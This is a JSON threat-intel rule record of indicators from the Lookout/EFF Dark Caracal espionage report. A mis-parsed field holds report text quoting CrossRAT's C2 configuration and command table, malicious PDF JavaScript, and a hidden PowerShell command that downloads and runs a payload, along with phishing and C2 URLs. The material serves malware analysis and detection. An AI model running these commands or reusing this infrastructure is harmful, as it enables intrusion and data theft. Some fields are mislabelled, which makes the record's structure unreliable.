{"rule_id": 755, "name": "Lookout_Dark-Caracal_srr_20180118_us_v.1.0", "description": "-", "references": [], "File_Names": ["receive.MySe", "apachefriends.org", "ScanResult.html", "hicham.dika", "download.html", "adobeair.net", "paktest.ddns", "fixed.doc", "flexberry.com", "chmplg.exe", "Date.html", "Wigle.net", "shinjiru.com", "mediamgrs.jar", "arabpublisherslb.com", "facebookservices.org", "1101.html", "com.esn", "skypeservice.no", "Calls.html", "www.cmcm", "twiterservices.org", "BL920123.doc", "ne.abc", "gmailservices.org", "add.php", "fbarticles.com", "eff.org", "basics.html", "Phone.html", "telegram.plus", "jaysonj.no"], "MD5_Hashes": ["d965c3736e530bfdbfde2cc6a264f2aa"], "SHA1_Hashes": ["edf037efc400ccb9f843500103a208fe1f254453", "47243997992d253f7c4ea20f846191697999cd57", "309038fceb9a5eb6af83bd9c3ed28bf4487dc27d", "4896b0c957b6a985b2b6efe2ffe517dceaa6ce01", "eaed6ce848e68d5ec42837640eb21d3bfd9ae692", "ed4754effda466b8babf87bcba2717760f112455", "35b70d89af691ac244a547842b7c8dfd9a7233fe", "6a2d5c0a4cc5b5053f5c8f15c447316fae66b57b", "7d47da505f8d3ee153629b373f6792c8858f76e8", "b0151434815f8b3796ab83848bf6969a2b2ad721", "835befd9376f90a12892876b482c1dcc39643a09", "bfbe5218a1b4f8c55eadf2583a2655a49bf6a884"], "SHA256_Hashes": ["b6ac374f79860ae99736aaa190cce5922a969ab060d7ae367dbfa094bfe4777d", "a3ae05a134b30b8c8869d0acd65ed5bca160988b404c146a325f2399b9c1a243", "f2178146741f91923c7d3e2442bd08605ed5a0927736e8cfdea00c055b2c6284", "da81aec00b563123d2fbd14fb6a76619c90f81e83c5bd8aa0676922cae96b9ad", "9cf3d3c0b790cebeacb8cb577cd346a6513b1b74fa120aff8984aa022301562e", "bf600e7b27bdd9e396e5c396aba7f079c244bfb92ee45c721c2294aa36586206", "5e0d061531071e53b3b993e06ce20dae6389a7e9eba5d7887399de48e2f2d278", "22eee43887e94997f9f9786092ffd3a9b51f059924cba678cf7b62cfafa65b28", "d57701321f2f13585a02fc8ba6cbf1f2f094764bfa067eb73c0101060289b0ba", "15af5bbf3c8d5e5db41fd7c3d722e8b247b40f2da747d5c334f7fd80b715a649", "ba4e063472a2559b4baa82d5272304a1cdae6968145c5ef221295c90e88458e2", "26419a0b6e033cdcb7bf4ca6b0b24fda35490cc6f2796682fb9403620f63d428", "400bca713ba1def9cdbc0e84fc97447db2fa3d12b1c5ef352ef985b7787b6ca4", "6b6d363d653785f420dcc1a23c9d9b8b76b8647209b52562b774c793dc0e3f6b", "ce583821191345274cd954b2db7da9742c239fe413fc17dcb97ffdd7b51cb072", "86f1bbda3ebf03a0f0a79d7bd1db68598ace9465f5cebb7f66773f8a818b4e8b", "5c1622cabf21672a8a5379ce8d0ee0ba6d5bc137657f3779faa694fcc4bb3988", "675c3d96070dc9a0e437f3e1b653b90dbc6700b0ec57379d4139e65f7d2799cd", "ed25b0c20b1c1b271a511a1266fe3967ab851aaa9f793bdf4f3d19de1dcf6532", "f9f2e632535b214a0fab376b32cbee1cab6507490c22ba9e12cfa417ed8d72bb", "f581a75a0f8f8eb200a283437bed48f30ae9d5616e94f64acfd93c12fcef987a", "e5eeb0a46dac58b171ebcefec60e9ff351fc7279d95892c6f48f799a1a364215", "a91c2cad20935a85d6eed72ef663254396914811f043018732d29276424a9578", "091ae8d5649c4e040d25550f2cdf7f1ddfc9c698e672318eb1ab6303aa1cf85b", "ed97719c008422925ae21ff34448a8c35ee270a428b0478e24669396761d0790", "fcf8f9566868d65d901fd6db9a8d6decacb860f5595f84a6a878193eda11549d"], "Registry_Entries": ["HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. \n\n  33\n\nSECURITY RESEARCH REPORT\fCrossRAT\nWhile investigating the axroot[.]com domain, we discovered a new remote access trojan called CrossRAT that we believe was \n\ndeveloped by, or for, Dark Caracal. Written in Java with the ability to target Windows, Linux, and OSX, CrossRAT is able to \n\nmanipulate the file system, take screenshots, run arbitrary DLLs for secondary infection on Windows, and gain persistence on  \n\nthe infected system. \n\nWhen executed in a Windows environment, CrossRAT attempts to copy itself to %AppData%\\Local\\ Temp\\mediamgrs.jar before, \n\nlike Bandook, creating an auto-start registry key in HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run with the \n\nname \u201cmediamgrs\u201d. \n\nOn OSX and Linux, it attempts to write a copy of itself to /usr/var/mediamgrs.jar. If CrossRAT does not have sufficient permissions \n\nto write to this directory, it will fail back to the following path under the user\u2019s home directory: $HOME/Library/mediamgrs.jar.  \n\nFor CrossRAT installations on OSX, a Launch Agent is created under $HOME/Library/ LaunchAgents/mediamgrs.plist to ensure \n\nthat it will be launched again when the computer restarts. When on Linux, this persistence is achieved by writing an autorun file  \n\nto $HOME/.config/autostart/mediamgrs.desktop.\n\nCrossRAT performs communications to its C2 infrastructure via a TCP socket. The following is an example of content sent over  \n\nthe wire from a compromised machine:\n\n5287249f-caa2-4b66-850c-49eedd46cf47$#@@0000$#@192.168.1.16$#@Windows \n7$#@6.1$#@EFFuser^585948$#@0.1$#@GROUP2$#@&&&\n\nCrossRAT uses a similar structure to Pallas and Bandook when communicating with infrastructure. Specifically, it uses &&& to \n\nterminate the response string and uses @### to start command strings.\n\nBelow is a code snippet from a CrossRAT sample. The response prefixes, hard coded C2 server of flexberry[.]com, and fixed  \n\nport of 2223, are clearly visible. \n\npublic final class k\n{\n    public static boolean a = false;\n\n    // Hardcoded C2 Information\n    public static String b = \u201cflexberry.com\u201d; // C2 Server\n    public static int c = 2223; // C2 Port\n\n  34\n\nSECURITY RESEARCH REPORT\f(continued from page 34)\n\n    public static String d = \u201c$#@\u201d; // Argument delimiter\n    public static String e = \u201c^!@\u201d; // delimiter within arguments \n    public static UUID f;\n    public static String g;\n    public static Preferences h;\n    public static String i = \u201c0.1\u201d; // Version Number\n    public static String j = \u201cGROUP2\u201d; // Campaign name \n    public static Socket k;\n    public static Socket l;\n\n    // Server command prefixes \n    public static String m = \u201c@0000\u201d; // Enumerate root directories on the system. 0 args\n    public static String n = \u201c@0001\u201d; // Enumerate files on the system. 1 arg\n    public static String o = \u201c@0002\u201d; // Create blank file on system. 1 arg\n    public static String p = \u201c@0003\u201d; // Copy File. 2 args\n    public static String q = \u201c@0004\u201d; // Move file. 2 args\n    public static String r = \u201c@0005\u201d; // Write file contents. 4 args \n    public static String s = \u201c@0006\u201d; // Read file contents. 4 args\n    public static String t = \u201c@0007\u201d; // Heartbeat request. 0 args\n    public static String u = \u201c@0008\u201d; // Get screenshot. 0 args\n    public static String v = \u201c@0009\u201d; // Run a DLL (windows only). 1 arg\n\n    // Client response prefixes \n    public static String w = \u201c@0000\u201d; // client hello\n    public static String x = \u201c@0001\u201d; // heartbeat response\n    public static String y = \u201c@0002\u201d; // List of system root directories \n    public static String z = \u201c@0003\u201d; // Status message for file manager connect, unimplemented\n    public static String A = \u201c@0004\u201d; // Status message for file manager connect, unimplemented\n    public static String B = \u201c@0005\u201d; // List of files on system\n    public static String C = \u201c@0006\u201d; // End list of files on system\n    public static String D = \u201c@0007\u201d; // file created status message\n    public static String E = \u201c@0008\u201d; // file written status message\n    public static String F = \u201c@0009\u201d; // file moved status message\n    public static String G = \u201c@0010\u201d; // file write status\n    public static String H = \u201c@0011\u201d; // file read status and file contents\n    public static String I = \u201c@0012\u201d; // send screenshot contents\n    public static String J = \u201c@0013\u201d; // Run DLL status message\n    public static String K; // Filepath for CrossRAT\n\nAnalysis of CrossRAT shows that it has a version number of 0.1, which indicates that its malicious capabilities are still under \n\ndevelopment. Implemented functionality includes the ability to enumerate attacker-specified directories, copy / move / read  \n\nfiles, beacon to C2 infrastructure, run attacker specific libraries (Windows only), and create empty files. The CrossRAT sample  \n\nwe discovered was last modified in March of 2017.\n\n  35\n\nSECURITY RESEARCH REPORT\fInfected Documents\nWe identified several Word documents which appear to be intended for use as infection vectors in phishing attacks. \n\nNone of the documents appear to contain any exploits, but rather rely on macros to run malicious code on a target \n\nsystem. If executed in an environment that has macros enabled, the malware downloads its second stage components. \n\nWe saw this same process in numerous malicious PDF files that used javascript to download secondary stages. The \n\nfollowing script is an example of this functionality, which is identical to the malicious Word doc with the SHA256 hash \n\ne5eeb0a46dac58b171ebcefec60e9ff351fc7279d95892c6f48f799a1a364215 (Word macro fixed.doc). \n\nvar v = app.viewerVers, ion;\nif (v < 7) {\n    var n = 0;\n    if (this.dataObjects != null) n = this.dataObjects.length;\n    if (v >= 5 && v < 6 && n > 0 && (app.viewerVariation == \u201cFull\u201d || app.viewerVariation == \n\u201cFill-In\u201d)) {\n        if (this.external\\) app.alert(\u201cThis document has file attachments. To view the \nattachments, click the Save button to save a copy of the document, open the copy in Acrobat, \nand use the File > Document Properties > Embedded Data Objects menu.\u201d, 3, 0);\n        else app.\\alert(\u201cThis document has file attachments. Use the File > Document Properties \n> Embedded Data Objects menu to view the attachments.\u201d, 3, 0);\n    } else if (v >= 6 && v < 7) {\n        if (n == 0) {\n            var np = this.numPages;\n            syncAnnotScan();\\\n            for (var p = 0; p < np && n == 0; ++p) {\n                var annots = this.getAnnots(p);\n                if (annots != null) {\n                    for (var i = 0; i < annots.length; ++i) {\n                        if (annots[i].type == \u201cFileAttachment\u201d) {\n                            n = 1;\\\n                            break;\n                        }\n                    }\n                }\n            }\n        }\n        if (n > 0) {\n            if (this.external) app.alert(\u201cThis document has file attachments. To view the \nattachments, click the black triangle at the top of the document window\u2019s vertical scrollbar \nand \\\nchoose File Attachments.\u201d, 3, 0);\n            else app.alert(\u201cThis document has file attachments. Use the Document > File \nAttachments menu to view the attachments.\u201d, 3, 0);\n        }\n    }\n}\n\n--- \nthis.exportDataObject({ cName: \u201cBL920123.doc\u201d, nLaunch: 2 });\n\n  36\n\nSECURITY RESEARCH REPORT\fFigure 26: An observed malicious Word file that, when executed, attempts to run macros in order to download \nand execute Bandook stage one\n\nOther Samples\nSurprisingly, we also observed a malicious Microsoft Compiled HTML Help file with the .chm extension. Primarily used for \n\nsoftware documentation, .chm files were first introduced with the release of Window 98. However, they are still supported in \n\nWindows 7. The chm file attempts to execute a command via Powershell that downloads an additional file called ne.abc from  \n\nthe server cma-cgrm[.]com. Below is the command contained in the malicious .chm file. \n\ncmd.exe,/c powershell.exe -ExecutionPolicy bypass -noprofile \n\n-WindowStyle Hidden (New-Object  \n\nSystem.Net.WebClient).DownloadFile(\u2018https://cma-     \n\ncgrm[.]com/ebusiness/ne.abc\u2019,\u2019%TEMP%\\chmplg.exe\u2019);Start-Process \n\n%TEMP%\\chmplg.exe;\n\nAt the time of analysis, this server was no longer live and, as such, the associated ne.abc binary has not yet been acquired and \n\ndoes not appear on VirusTotal. The cma-cgrm[.]com domain is not obviously connected with other infrastructure.\n\n  37\n\nSECURITY RESEARCH REPORT\fInfrastructure\n\nWhile analyzing adobeair[.]net, we uncovered sprawling infrastructure used by Dark Caracal. This infrastructure serves a broad \n\nset of purposes, including acting as storage for exfiltrated data, masquerading as an Android App Store hosting malware, \n\ndelivering attacker commands to infected devices, and providing phishing content aimed at gathering credentials for various  \n\nwell known services. \n\nWe found much of this infrastructure hosted on servers provided by Shinjiru, an offshore bulletproof hosting provider that allows \n\nits customers to host almost any content. WHOIS information listed for the adobeair[.]net C2 server led to the discovery of many \n\nof these domains, as did scanning of Shinjiru IP blocks for servers running a set of services. This acted as a fingerprint for Dark \n\nCaracal\u2019s infrastructure. To date, the following domains and IPs have been identified as connected to the infrastructure used  \n\nby Dark Caracal. \n\nDomain\n\nLinks / Connection to Dark Caracal\n\nadobeair[.]net\n\nShared C2 server / Exfiltrated data server\n\nsecureandroid[.]info\n\nBlackmarket \u201cAndroid App Store\u201d \n\ntweetsfb[.]com\n\nfbarticles[.]com\n\nWatering hole, Facebook groups, used to phish credentials, running Apache Win32 \n\nPhishing domain linked by WHOIS (op13)\n\nArablivenews[.]com [EXPIRED]\n\nWHOIS (op13)\n\nNancyrazzouk[.]com [EXPIRED]\n\nWHOIS (nancyrazzouk)\n\nArabpublisherslb[.]com \n\nWHOIS (nancyrazzouk)\n\nflexberry[.]com\n\n94[.]229[.]70[.]7 (Windows)\n\nplanethdx[.]com\n\n94[.]229[.]70[.]7 (Windows)\n\nglobalmic[.]net\n\nmegadeb[.]com\n\nopwalls[.]com\n\n94[.]229[.]70[.]7 (Windows)\n\n94[.]229[.]70[.]7 (Windows)\n\n94[.]229[.]70[.]7 (Windows)\n\nmecodata[.]com\n\n94[.]229[.]70[.]7 (Windows)\n\nsabisint[.]com\n\nroxsoft[.]net\n\naxroot[.]com\n\n94[.]229[.]70[.]7 (Windows)\n\n94[.]229[.]70[.]7 (Windows)\n\nWindows malware campaign\n\nskypeupdate[.]com\n\nWindows malware campaign\n\nplayermea[.]com\n\nWindows malware campaign\n\nkaliex[.]net\n\ntenoclock[.]net\n\nancmax[.]com\n\nWindows malware campaign\n\nWindows malware campaign\n\nWindows malware campaign\n\n  38\n\nSECURITY RESEARCH REPORT\fThe following relevant contact information has also been identified during this investigation. \n\nEmail\n\nLink/Context\n\nop13@mail[.]com\n\nPrimary email contact for C2 server. Associated with \u201crami jabbour\u201d \u201cHadi Maz\n\nnancyrazzouk@mail[.]com\n\nnancyrazzouk\n\nhicham.dika@mail[.]com\n\nSSL cert in exe\n\nhetemramadani5@gmail.com\n\nSSL cert in exe\n\nalecouperus@mail.com\n\nSSL cert in exe\n\nPrimary Command and Control Server\n\nAs noted, adobeair[.]net is hosted on Shinjiru. This bulletproof hosting company allows its customers to host almost any type of \ncontent, protects client identity, accepts Bitcoin for payment, and is more resilient than other providers to takedowns22. Shinjiru \n\nhas also been used to host many of the Dark Caracal Windows domains dating back over seven years to April 27th, 2010 \n\n(see a list of Windows malware domains in the Windows infrastructure section below).\n\nAt the time of writing, adobeair[.]net is currently live and running a fairly unique set of services. We have used this server as a \n\nfingerprint in the discovery of further related infrastructure. These services include XAMPP for Windows 5.6.31, Apache 2.4.26, \nMariaDB 10.1.25, PHP 5.6.31, phpMyAdmin 4.7.0, and OpenSSL 1.0.2. We confirmed these via an nmap scan of the adobeair server.23 \n\nFigure 27: Nmap scan of adobeair[.]net\n\n22 https://www.shinjiru.com/company/about-us/\n\n23 https://www.apachefriends.org/download.html\n\n  39\n\nSECURITY RESEARCH REPORT\fThe adobeair[.]net C2 server had the Apache mod_status module enabled. This provides operators with information on server \n\nactivity, performance, and a statistics page under /server-status that details connected clients and the server resources they are \n\naccessing. By programmatically monitoring this page, we were able to determine the source IPs of infected clients and admins \n\nlogging into the console.\n\nThe adobeair[.]net server has, as of late September 2017, been moved to a new hosting provider, M247, and the operators have \n\nimproved the security. \n\nWHOIS history for adobeair[.]net lists Nancy Razzouk with an email address of op13@mail[.]com as the registrant. We have identified \n\nthe \u201cNancy Razzouk\u201d persona as the SSL signer of the Windows malware samples and the registrant of multiple domains. Its reuse \n\nhas helped identify further Dark Caracal infrastructure.\n\nFigure 28: WHOIS information for adodeair[.]net as observed in August 2017\n\n  40\n\nSECURITY RESEARCH REPORT\fWatering Hole Server\n\nDuring this investigation, we determined this server is the only infrastructure we discovered that serves up malicious apps \n\nbelonging to the Pallas malware family. A detailed analysis of these applications can be found under the Android Surveillanceware \n\nsection. As with other Dark Caracal infrastructure, the secureandroid[.]info domain was also registered with the bulletproof hosting \n\ncompany Shinjiru.\n\nWe found links to these landing pages in the exfiltrated content of compromised devices, which indicates it is actively being used \n\nduring the attack chain. As of December 2017 it appears that secureandroid[.]info has had its domain expire.\n\nFigure 29: Screenshot of the secureandroid[.]info watering hole server, a \ndistribution point for Pallas\n\nPhishing Domains\n\nWe identified the Dark Caracal domain tweetsfb[.]com while analyzing the secureandroid[.]info server source code. We identified \n\ntwo bit[.]ly URLs on this server that resolve to other pages on the tweetsfb site that were carefully crafted to look like the Facebook \n\nand Twitter login portals. The copyright dates suggest these pages are clones of the originals from 2015. \n\nFigure 30: Dark Caracal clones of Twitter and Facebook login portals\n\n  41\n\nSECURITY RESEARCH REPORT \n\fThese bit[.]ly links and their respective resolving links are:\n\n\u2022  http://bit[.]ly/2j3r285 points to  \n\nhttp://www.tweetsfb[.]com/services/100001472583690/twitter/articles/100001/\n\n\u2022  http://bit[.]ly/2iByHcu points to  \n\nhttp://tweetsfb[.]com/services/100001472583690/facebook/groups/100002/\n\nThe tweetsfb[.]com domain was found to share an IP address (172.94.17.147) with the following additional domains.\n\nFigure 31: Domains sharing the same IP address as tweetsfb[.]com\n\nWe were able to find additional phishing campaigns in VirusTotal that referenced fbarticles[.]com. While fbarticles was registered \n\nby the op13@mail[.]com address with the name \u201cHadi Mazeh,\u201d the WHOIS information for fbtweets was private.\n\nFigure 32: Detections in VirusTotal for fbarticles[.]com\n\n  42\n\nSECURITY RESEARCH REPORT\fFigure 33: Detections in VirusTotal for the IP address that hosted fbarticles[.]com\n\nNote: we identified three further domains \u2014 \u201cfacebookservices[.]org\u201d, \u201cgmailservices[.]org\u201d, and \u201ctwiterservices[.]org\u201d that were \n\nonce a part of this campaign. Those domains now appear to be sinkholed.\n\nWhen we discovered these domains, the threat actors had already taken them offline and another individual had purchased \n\nthem. This individual is associated with unrelated domains that are connected to other APT reports. However, we noticed that \n\nthe individual purchased the domains after the APT reports went public. While we\u2019re not sure why this individual is purchasing, \n\nsinkholing, and monitoring these domains, we think it\u2019s an interesting note. \n\n  43\n\nSECURITY RESEARCH REPORT\fWindows C2 Servers \n\nThe Windows server infrastructure has a much longer history than the Android infrastructure, showing that the actors are willing \n\nto evolve to new technologies, such as mobile, as they become more valuable targets. \n\nThe Windows malware servers hosted control panels for multiple campaigns using various malware that included IRIS \n\nRAT, Bandook, and Arcom RAT. We found these servers hosting exfiltrated desktop content, Windows malware signed by \n\n\u201calecouperus@mail[.]com\u201d, and the CrossRAT trojan.\n\nAll of these domains share the same IP on more than one occasion and have migrated between hosting providers in the same \n\ntime window. Most of these domains were hosted on Shinjiru, the same hosting server for the Android campaign.\n\nancmax[.]com\n\nsabisint[.]com\n\nplanethdx[.]com\n\nmegadeb[.]com\n\nmecodata[.]com\n\nroxsoft[.]net\n\nglobalmic[.]net\n\nflexberry[.]com\n\nkaliex[.]net\n\naxroot[.]com\n\nopwalls[.]com\n\nThe following screenshot shows HTTP 200 OK response codes for http://<server>/<Payload>/\n\nEach of the following directories contained a login panel for either IRIS RAT or Arcom RAT.\n\nFigure 34: Various RAT login portals found on a mix of the C2 servers\n\n  44\n\nSECURITY RESEARCH REPORT\fUsing the Wayback Machine we identified the signature Win32 apache server running on skypeupdate[.]com in 2016. This server \n\nwas first seen resolving to an IP belonging to Shinjiru in late 2013 and last seen resolving to a Shinjiru IP in late 2016.\n\nThe oldest domain we identified as part of this infrastructure is flexberry[.]com. The following screenshot shows passive DNS \n\nresolution dating back to 2010.\n\nFigure 35: Passive DNS resolutions for the infrastructure\n\n  45\n\nSECURITY RESEARCH REPORT\fAppendix\n\nIndicators of Compromise and Actor Tracking\n\nIOC\n\nEmail\n\nop13@mail[.]com\n\nhicham.dika@mail[.]com\n\nnancyrazzouk@mail[.]com\n\nalecouperus@mail[.]com\n\nhetemramadani5@gmail.com\n\ninfo@secureandroid[.]info\n\nIP\n\n111.90.141[.]70\n\n111.90.145[.]64\n\n111.90.141[.]38\n\n111.90.158.121\n\n111.90.141.169\n\n111.90.145.64\n\n111.90.150.221\n\n180.235.133.57\n\n172.111.250.156\n\n77.78.103.41\n\n74.208.167[.]252\n\n111.90.140[.]11\n\n111.90.150[.]221\n\nPhone Number\n\n+7820435193\n\n+7820944266\n\n+7820944266\n\nDomain\n\nadobeair[.]net\n\ntweetsfb[.]com\n\nsecureandroid[.]info\n\nfbtweets[.]net\n\ngsec[.]in\n\narabpublisherslb[.]com\n\nsabisint[.]com\n\nfbarticles[.]com\n\nplanethdx[.]com\n\nopwalls[.]com\n\nkaliex[.]net\n\naxroot[.]com\n\nmegadeb[.]com\n\nmecodata[.]com\n\nroxsoft[.]net\n\nflexberry[.]com\n\nglobalmic[.]net\n\nplayermea[.]com\n\n  46\n\nSECURITY RESEARCH REPORT\f(continued from page 46)\n\narablivenews[.]com\n\necowatchasia[.]com\n\netn9[.]com\n\nancmax[.]com\n\ntenoclock[.]net\n\nkaliex[.]net\n\nmangoco[.]net\n\njaysonj.no-ip[.]biz\n\norange2015[.]net\n\nskypeservice.no-ip[.]org\n\naccountslogin[.]services\n\nadobeinstall[.]com\n\nadobe-flashviewer.accountslogin[.]services\n\ndropboxonline[.]com\n\niceteapeach[.]com\n\nnvidiaupdate[.]com\n\nskypeupdate[.]com\n\npaktest.ddns[.]net\n\nwatermelon2017[.]com\n\nMobile Implant Apps\n\nIOC\n\nType\n\nPackageName\n\nb0151434815f8b3796ab83848bf6969a2b2ad721\n\nbfbe5218a1b4f8c55eadf2583a2655a49bf6a884\n\n47243997992d253f7c4ea20f846191697999cd57\n\ned4754effda466b8babf87bcba2717760f112455\n\n309038fceb9a5eb6af83bd9c3ed28bf4487dc27d\n\neaed6ce848e68d5ec42837640eb21d3bfd9ae692\n\nedf037efc400ccb9f843500103a208fe1f254453\n\n35b70d89af691ac244a547842b7c8dfd9a7233fe\n\n7d47da505f8d3ee153629b373f6792c8858f76e8\n\n4896b0c957b6a985b2b6efe2ffe517dceaa6ce01\n\n6a2d5c0a4cc5b5053f5c8f15c447316fae66b57b\n\nSHA1\n\nSHA1\n\nSHA1\n\nSHA1\n\nSHA1\n\nSHA1\n\nSHA1\n\nSHA1\n\nSHA1\n\nSHA1\n\nSHA1\n\ncom.primo.mobile.android.app\n\norg.thoughtcrime.securesms\n\ncom.psiphon3\n\ncom.gbwhatsapp\n\norg.telegram.plus\n\norg.torproject.android\n\norg.telegram.plus\n\nch.threema.app\n\ncom.flashplayer.player\n\ncom.flashplayer.player\n\ncom.flashplayer.player\n\n  47\n\nSECURITY RESEARCH REPORT\fDesktop Implant Apps\n\nSHA2 Sum\n\nFile Type\n\nce583821191345274cd954b2db7da9742c239fe413fc17dcb97ffdd7b51cb072\n\nMS Windows HtmlHelp Data\n\nba4e063472a2559b4baa82d5272304a1cdae6968145c5ef221295c90e88458e2\n\nPE32 executable (DLL) (GUI) Intel 80386\n\n26419a0b6e033cdcb7bf4ca6b0b24fda35490cc6f2796682fb9403620f63d428\n\nPE32 executable (GUI) Intel 80386\n\n15af5bbf3c8d5e5db41fd7c3d722e8b247b40f2da747d5c334f7fd80b715a649\n\nZip archive data\n\n22eee43887e94997f9f9786092ffd3a9b51f059924cba678cf7b62cfafa65b28\n\nPE32 executable (GUI) Intel 80386\n\nfcf8f9566868d65d901fd6db9a8d6decacb860f5595f84a6a878193eda11549d\n\nPDF document, version 1.6\n\nf2178146741f91923c7d3e2442bd08605ed5a0927736e8cfdea00c055b2c6284\n\nPDF document, version 1.6\n\n6b6d363d653785f420dcc1a23c9d9b8b76b8647209b52562b774c793dc0e3f6b\n\ndata\n\na3ae05a134b30b8c8869d0acd65ed5bca160988b404c146a325f2399b9c1a243\n\nPE32 executable (DLL) (GUI) Intel 80386\n\ne5eeb0a46dac58b171ebcefec60e9ff351fc7279d95892c6f48f799a1a364215\n\nComposite Document File V2 Document\n\n400bca713ba1def9cdbc0e84fc97447db2fa3d12b1c5ef352ef985b7787b6ca4\n\nMicrosoft Word 2007+\n\n5e0d061531071e53b3b993e06ce20dae6389a7e9eba5d7887399de48e2f2d278\n\nComposite Document File V2 \n\nf9f2e632535b214a0fab376b32cbee1cab6507490c22ba9e12cfa417ed8d72bb\n\nMS-DOS executable\n\nbf600e7b27bdd9e396e5c396aba7f079c244bfb92ee45c721c2294aa36586206\n\nPE32 executable (GUI)\n\nda81aec00b563123d2fbd14fb6a76619c90f81e83c5bd8aa0676922cae96b9ad\n\nPE32 executable (GUI) Intel 80386\n\n9cf3d3c0b790cebeacb8cb577cd346a6513b1b74fa120aff8984aa022301562e\n\nPE32 executable (DLL) (GUI) Intel 80386\n\n091ae8d5649c4e040d25550f2cdf7f1ddfc9c698e672318eb1ab6303aa1cf85b\n\nPE32 executable (GUI) Intel 80386\n\na91c2cad20935a85d6eed72ef663254396914811f043018732d29276424a9578\n\nPE32 executable (GUI) Intel 80386\n\nb6ac374f79860ae99736aaa190cce5922a969ab060d7ae367dbfa094bfe4777d\n\nPE32 executable (GUI) Intel 80386\n\ned97719c008422925ae21ff34448a8c35ee270a428b0478e24669396761d0790\n\nPE32 executable (GUI) Intel 80386\n\n5c1622cabf21672a8a5379ce8d0ee0ba6d5bc137657f3779faa694fcc4bb3988\n\nPE32 executable (GUI) Intel 80386\n\n86f1bbda3ebf03a0f0a79d7bd1db68598ace9465f5cebb7f66773f8a818b4e8b\n\nPE32 executable (DLL) (GUI) Intel 80386\n\n675c3d96070dc9a0e437f3e1b653b90dbc6700b0ec57379d4139e65f7d2799cd\n\nPE32 executable (DLL) (GUI) Intel 80386\n\ned25b0c20b1c1b271a511a1266fe3967ab851aaa9f793bdf4f3d19de1dcf6532\n\nPE32 executable (GUI) Intel 80386\n\nf581a75a0f8f8eb200a283437bed48f30ae9d5616e94f64acfd93c12fcef987a\n\nPE32 executable (GUI) Intel 80386\n\nd57701321f2f13585a02fc8ba6cbf1f2f094764bfa067eb73c0101060289b0ba\n\nPE32 executable (GUI) Intel 80386\n\n  48\n\nSECURITY RESEARCH REPORT\fLookout Website\n\nwww.lookout.com\n\nBlog\n\nblog.lookout.com \n\nEmail\n\nthreatintel@lookout.com\n\nTwitter\n\n@lookout \n\nEFF Website\n\nwww.eff.org\n\nBlog\n\nwww.eff.org/deeplinks\n\nEmail\n\npress@eff.org\n\nTwitter\n\n@eff \n\nAbout Lookout\n\nLookout is a cybersecurity company for a world run by apps. \n\nPowered by the largest dataset of mobile code in existence, \n\nLookout is the security platform of record for mobile device \n\nintegrity and data access. Lookout is trusted by hundreds \n\nof millions of individuals, hundreds of enterprises and \n\ngovernment agencies, and such ecosystem partners as AT&T, \n\nDeutsche Telekom, and Microsoft. Headquartered in San \n\nFrancisco, Lookout has offices in Amsterdam, Boston, London, \n\nSydney, Tokyo, Toronto and Washington, D.C.\n\nAbout EFF\n\nThe Electronic Frontier Foundation is the leading nonprofit \n\norganization defending civil liberties in the digital world. \n\nFounded in 1990, EFF champions user privacy, free expression, \n\nand innovation through impact litigation, policy analysis, \n\ngrassroots activism, and technology development. We work to \n\nensure that rights and freedoms are enhanced and protected as \n\nour use of technology grows.\n\nContributors\n\nAndrew Blaich, Lookout \n\nApurva Kumar, Lookout \n\nJeremy Richards, Lookout \n\nMichael Flossman, Lookout \n\nCooper Quintin, EFF \n\nEva Galperin, EFF\n\nSpecial thanks to the many others in our organization, and to our \n\npartners, who contributed significantly to this work.\n\n  49\n\nSECURITY RESEARCH REPORT1-888-988-5795   |   lookout.com \u00a9 2018 Lookout, Inc. LOOKOUT\u00ae, the Lookout Shield Design\u00ae, LOOKOUT with Shield Design\u00ae, SCREAM\u00ae, and SIGNAL FLARE\u00ae are registered trademarks of Lookout, Inc. in the United States and other countries. EVERYTHING IS OK\u00ae, LOOKOUT MOBILE SECURITY\u00ae, and PROTECTED BY LOOKOUT\u00ae, are registered trademarks of Lookout, Inc. in the United States. POWERED BY LOOKOUT\u2122 is a trademark of Lookout, Inc. All other brand and product names are trademarks or registered trademarks of their respective holders. 20180118-Lookout-USv1.0 \n\f"], "URLs": ["https://www.threatconnect.com/blog/how-to-investigate-incidents-in-threatconnect/", "https://adobeair[.]net/<campaign_identifier>/<add.php", "http://<server>/<Payload>/", "https://en.wikipedia.org/wiki/Telecommunications_in_Lebanon", "http://tweetsfb[.]com/services/100001472583690/facebook/groups/100002/", "https://adobeair[.]net/wp9/add.php", "https://www.checkpoint.com/downloads/volatile-cedar-technical-report.pdf", "http://www.cmcm.com/blog/en/security/2017-08-16/1101.html", "http://bit[.]ly/2iByHcu", "https://stackoverflow.com/questions/15554296/simple-java-aes-encrypt-decrypt-example", "https://blog.lookout.com/pegasus-android", "https://adobeair[.]net/wp9/upload.php", "https://www.shinjiru.com/company/about-us/", "http://www.tweetsfb[.]com/services/100001472583690/twitter/articles/100001/", "https://citizenlab.ca/2015/10/mapping-finfishers-continuing-proliferation/", "https://developer.android.com/reference/android/net/wifi/ScanResult.html", "https://developer.android.com/reference/android/provider/ContactsContract.CommonDataKinds.Phone.html", "https://docs.oracle.com/javase/7/docs/api/java/sql/Date.html", "https://developer.android.com/guide/topics/providers/content-provider-basics.html", "http://bit[.]ly/2j3r285", "https://www.apachefriends.org/download.html", "https://blog.lookout.com/trident-pegasus", "https://developer.android.com/reference/android/provider/CallLog.Calls.html", "https://en.wikipedia.org/wiki/FinFisher", "https://cma-"], "weight": 0.0}